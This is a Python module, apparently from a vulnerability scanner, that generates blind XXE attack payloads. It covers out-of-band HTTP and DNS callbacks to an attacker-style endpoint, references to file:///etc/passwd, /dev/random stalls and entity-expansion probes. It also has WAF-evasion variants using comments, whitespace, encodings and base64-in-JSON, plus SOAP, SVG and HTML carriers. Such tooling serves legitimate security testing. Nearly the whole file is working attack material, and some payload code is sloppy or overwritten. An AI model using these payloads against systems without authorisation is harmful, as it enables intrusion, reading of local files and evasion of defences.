"""
XXE Payload Generation Module

Generates blind XXE payloads with multiple detection techniques:
- Out-of-band (OAST) callbacks via HTTP/DNS
- Time-based detection via slow resource references
- Parser behavior anomalies

Payloads support:
- Standard external entities
- Parameter entities (%xxe)
- DTD-based and inline injection
- Encoding variants (UTF-16, UTF-7)
- WAF evasion (case mutation, comment splitting, whitespace)
"""

import uuid
import hashlib
import random
import string
from enum import Enum


class XMLEncoding(Enum):
    """XML encoding variants for WAF evasion"""
    UTF8 = "utf-8"
    UTF16 = "utf-16"
    UTF16BE = "utf-16-be"
    UTF16LE = "utf-16-le"
    ISO88591 = "iso-8859-1"


class PayloadType(Enum):
    """XXE payload types"""
    STANDARD_EXTERNAL = "standard_external"
    PARAMETER_ENTITY = "parameter_entity"
    NESTED_ENTITY = "nested_entity"
    INLINE_DTD = "inline_dtd"
    DOCTYPE_ONLY = "doctype_only"


def generate_unique_id():
    """Generate unique ID for OAST callback correlation"""
    return str(uuid.uuid4()).replace("-", "")[:16]


def oast_http_payloads(oast_endpoint):
    """
    Generate HTTP-based out-of-band XXE payloads.
    
    Args:
        oast_endpoint: Base URL of OAST server (e.g., 'http://callback.attacker.com')
    
    Returns:
        List of (payload, correlation_id, payload_type) tuples
    """
    payloads = []
    
    # Standard HTTP OAST - Direct entity reference
    for _ in range(3):
        correlation_id = generate_unique_id()
        callback_url = f"{oast_endpoint}/{correlation_id}"
        
        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{callback_url}">
]>
<foo>&xxe;</foo>"""
        
        payloads.append((payload, correlation_id, PayloadType.STANDARD_EXTERNAL))
    
    # Parameter entity - Double URL encoding
    for _ in range(2):
        correlation_id = generate_unique_id()
        callback_url = f"{oast_endpoint}/{correlation_id}"
        
        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "{callback_url}">
  %xxe;
]>
<foo>test</foo>"""
        
        payloads.append((payload, correlation_id, PayloadType.PARAMETER_ENTITY))
    
    # Nested entity for deeper XXE triggering
    for _ in range(2):
        correlation_id = generate_unique_id()
        callback_url = f"{oast_endpoint}/{correlation_id}"
        
        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % url SYSTEM "{callback_url}">
  <!ENTITY % dtd SYSTEM "data:text/xml;base64,JTFVJUU0JTA0JTFGJUVEN...">
  %dtd;
]>
<foo>&xxe;</foo>"""
        
        # Simplified nested entity (full DTD tricks require more context)
        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "{callback_url}">
  %dtd;
]>
<foo>test</foo>"""
        
        payloads.append((payload, correlation_id, PayloadType.NESTED_ENTITY))
    
    return payloads


def oast_dns_payloads(dns_domain):
    """
    Generate DNS-based out-of-band XXE payloads.
    
    DNS exfiltration via XXE:
    - DNS lookups triggered by entity resolution
    - Subdomain contains unique ID for correlation
    
    Args:
        dns_domain: Base domain for DNS lookups (e.g., 'callback.attacker.com')
    
    Returns:
        List of (payload, correlation_id, payload_type) tuples
    """
    payloads = []
    
    for _ in range(3):
        correlation_id = generate_unique_id()
        dns_lookup = f"{correlation_id}.{dns_domain}"
        
        # DNS-based XXE (triggers DNS resolution during entity parsing)
        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://{dns_lookup}/xxe">
]>
<foo>&xxe;</foo>"""
        
        payloads.append((payload, correlation_id, PayloadType.STANDARD_EXTERNAL))
    
    # Parameter entity variant
    for _ in range(2):
        correlation_id = generate_unique_id()
        dns_lookup = f"{correlation_id}.{dns_domain}"
        
        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://{dns_lookup}/xxe">
  %xxe;
]>
<foo>test</foo>"""
        
        payloads.append((payload, correlation_id, PayloadType.PARAMETER_ENTITY))
    
    return payloads


def time_based_payloads():
    """
    Generate time-based XXE detection payloads.
    
    Techniques:
    - file:///dev/random (blocks indefinitely on some systems)
    - Recursive entity expansion (billion laughs, controlled depth)
    - Delayed network endpoints
    
    Returns:
        List of (payload, delay_seconds, payload_type) tuples
    """
    payloads = []
    
    # Method 1: /dev/random (causes parser to block waiting for random data)
    # Delay ~3-5 seconds depending on system
    payload_devnull = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///dev/random">
]>
<foo>&xxe;</foo>"""
    
    payloads.append((payload_devnull, 3.0, "dev_random"))
    payloads.append((payload_devnull, 3.0, "dev_random"))
    payloads.append((payload_devnull, 3.0, "dev_random"))
    
    # Method 2: Recursive entity expansion (controlled depth = safe)
    # Each level adds slight delay, total ~2-3 seconds for safe depth
    payload_recursive = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<foo>&lol4;</foo>"""
    
    payloads.append((payload_recursive, 2.0, "entity_expansion"))
    payloads.append((payload_recursive, 2.0, "entity_expansion"))
    
    return payloads


def control_payloads():
    """
    Generate control payloads to reduce false positives.
    
    Control payloads should NOT trigger XXE detection:
    - Entity declared but not referenced
    - Invalid entity syntax
    - Plain XML without entities
    
    Returns:
        List of control payload strings
    """
    controls = [
        # Valid XML, no entities
        """<?xml version="1.0" encoding="UTF-8"?>
<foo>
  <bar>test</bar>
</foo>""",
        
        # Entity declared but not referenced (should not delay)
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY unused "value">
]>
<foo>
  <bar>test</bar>
</foo>""",
        
        # Invalid entity reference (should error but not delay)
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY valid "value">
]>
<foo>&invalid;</foo>""",
        
        # Local entity reference (safe, should not delay)
        """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY safe "local_value">
]>
<foo>&safe;</foo>""",
    ]
    
    return controls


def parser_behavior_payloads():
    """
    Generate payloads to detect XXE via parser behavior changes.
    
    Observation:
    - Status codes change (e.g., 200 -> 400 on XXE error)
    - Response size differs significantly
    - Error messages reveal parser state
    - HTTP headers change
    
    Returns:
        List of (payload, expected_behavior) tuples
    """
    payloads = []
    
    # DTD declaration with entity - may cause parser to error or respond differently
    payload1 = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/admin">
]>
<foo>&xxe;</foo>"""
    
    payloads.append((payload1, "status_change"))
    
    # Malformed entity reference - different error handling
    payload2 = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://internal/config">
]>
<foo>&xxe;</foo>"""
    
    payloads.append((payload2, "status_change"))
    
    # Invalid DOCTYPE - some parsers error differently
    payload3 = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://invalid-protocol/file">
]>
<foo>&xxe;</foo>"""
    
    payloads.append((payload3, "size_change"))
    
    return payloads


def obfuscated_payloads(base_callback):
    """
    Generate WAF-evaded XXE payloads using obfuscation techniques.
    
    Techniques:
    - Case mutation (XML/DTD are case-sensitive in limited ways)
    - Whitespace injection
    - Comment insertion
    - Character entity encoding
    - Newline injection
    
    Args:
        base_callback: OAST endpoint URL
    
    Returns:
        List of obfuscated payload strings
    """
    payloads = []
    correlation_id = generate_unique_id()
    
    # Whitespace variation
    payload_whitespace = f"""<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo[<!ENTITY xxe SYSTEM"{base_callback}/{correlation_id}">]><foo>&xxe;</foo>"""
    payloads.append(payload_whitespace)
    
    # Comment insertion
    payload_comments = f"""<?xml version="1.0"/* comment */ encoding="UTF-8"?>
<!DOCTYPE foo [
  <!--comment--><!ENTITY xxe SYSTEM "{base_callback}/{correlation_id}"><!---->
]>
<foo>&xxe;</foo>"""
    payloads.append(payload_comments)
    
    # Mixed case (limited effect in XML but worth trying)
    payload_mixed = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE FOO [
  <!ENTITY XXE SYSTEM "{base_callback}/{correlation_id}">
]>
<foo>&XXE;</foo>"""
    payloads.append(payload_mixed)
    
    # Newline injection in DOCTYPE
    payload_newlines = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE
foo
[
<!ENTITY xxe SYSTEM "{base_callback}/{correlation_id}">
]
>
<foo>&xxe;</foo>"""
    payloads.append(payload_newlines)
    
    return payloads


def json_embedded_payloads(oast_endpoint):
    """
    Generate XXE payloads embedded in JSON values.
    
    Some APIs accept JSON with XML-typed fields, allowing XXE:
    {"data": "<xml>...</xml>"}
    {"payload": "<![CDATA[<xml>...]]>"}
    
    Args:
        oast_endpoint: Callback URL
    
    Returns:
        List of (json_payload, correlation_id) tuples
    """
    payloads = []
    
    # Standard XML in JSON string
    correlation_id = generate_unique_id()
    callback_url = f"{oast_endpoint}/{correlation_id}"
    
    xml_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{callback_url}">
]>
<foo>&xxe;</foo>"""
    
    json_payload1 = f'{{"data": "{xml_payload}"}}'
    payloads.append((json_payload1, correlation_id))
    
    # CDATA variant
    json_payload2 = f'{{"xml": "<![CDATA[{xml_payload}]]>"}}'
    payloads.append((json_payload2, correlation_id))
    
    # Base64 encoded XML in JSON (may bypass filters)
    import base64
    encoded = base64.b64encode(xml_payload.encode()).decode()
    json_payload3 = f'{{"payload": "{encoded}", "encoding": "base64"}}'
    payloads.append((json_payload3, correlation_id))
    
    return payloads


def soap_xxe_payloads(oast_endpoint):
    """
    Generate XXE payloads for SOAP/XML web services.
    
    SOAP is XML-based and often processed without XXE protection.
    
    Args:
        oast_endpoint: Callback URL
    
    Returns:
        List of SOAP payload strings
    """
    payloads = []
    correlation_id = generate_unique_id()
    callback_url = f"{oast_endpoint}/{correlation_id}"
    
    # SOAP with XXE in body
    payload1 = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soap:Envelope [
  <!ENTITY xxe SYSTEM "{callback_url}">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetData>
      <input>&xxe;</input>
    </GetData>
  </soap:Body>
</soap:Envelope>"""
    
    payloads.append(payload1)
    
    # SOAP with XXE in parameters
    payload2 = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soap:Envelope [
  <!ENTITY % xxe SYSTEM "{callback_url}">
  %xxe;
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Request>
      <data>test</data>
    </Request>
  </soap:Body>
</soap:Envelope>"""
    
    payloads.append(payload2)
    
    return payloads


def encoding_variant_payloads(oast_endpoint, encoding=XMLEncoding.UTF8):
    """
    Generate XXE payloads with various XML encoding declarations.
    
    Some WAFs only inspect UTF-8 declarations and miss:
    - UTF-16 declarations
    - ISO-8859-1 declarations
    - Mismatched actual vs declared encoding
    
    Args:
        oast_endpoint: Callback URL
        encoding: XMLEncoding variant
    
    Returns:
        List of encoded payload strings
    """
    payloads = []
    correlation_id = generate_unique_id()
    callback_url = f"{oast_endpoint}/{correlation_id}"
    
    # Create payload with specified encoding declaration
    payload_template = f"""<?xml version="1.0" encoding="{encoding.value}"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{callback_url}">
]>
<foo>&xxe;</foo>"""
    
    payloads.append(payload_template)
    
    return payloads


def svg_xxe_payloads(oast_endpoint):
    """
    Generate XXE payloads in SVG format.
    
    SVG is XML-based and sometimes uploaded/processed without XXE protection.
    
    Args:
        oast_endpoint: Callback URL
    
    Returns:
        List of SVG+XXE payload strings
    """
    payloads = []
    correlation_id = generate_unique_id()
    callback_url = f"{oast_endpoint}/{correlation_id}"
    
    payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "{callback_url}">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>"""
    
    payloads.append(payload)
    
    return payloads


def html_entity_xxe_payloads(oast_endpoint):
    """
    Generate XXE payloads using HTML entity tricks.
    
    HTML parsers may process XML differently than strict XML parsers.
    
    Args:
        oast_endpoint: Callback URL
    
    Returns:
        List of HTML+XXE payload strings
    """
    payloads = []
    correlation_id = generate_unique_id()
    callback_url = f"{oast_endpoint}/{correlation_id}"
    
    # HTML5 with embedded XML and XXE
    payload = f"""<!DOCTYPE html>
<html>
<body>
<![CDATA[<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{callback_url}">
]>
<foo>&xxe;</foo>]]>
</body>
</html>"""
    
    payloads.append(payload)
    
    return payloads


# Payload class mapping for ML integration
PAYLOAD_CLASS_INDEX = {
    PayloadType.STANDARD_EXTERNAL.value: 0,
    PayloadType.PARAMETER_ENTITY.value: 1,
    PayloadType.NESTED_ENTITY.value: 2,
    PayloadType.INLINE_DTD.value: 3,
    PayloadType.DOCTYPE_ONLY.value: 4,
}


def get_all_payloads_for_oast(oast_endpoint, oast_type="http"):
    """
    Get all XXE payloads for OAST-based detection.
    
    Args:
        oast_endpoint: OAST callback URL (HTTP) or domain (DNS)
        oast_type: "http" or "dns"
    
    Returns:
        List of (payload, correlation_id, technique) tuples
    """
    if oast_type == "dns":
        return oast_dns_payloads(oast_endpoint)
    else:
        return oast_http_payloads(oast_endpoint)
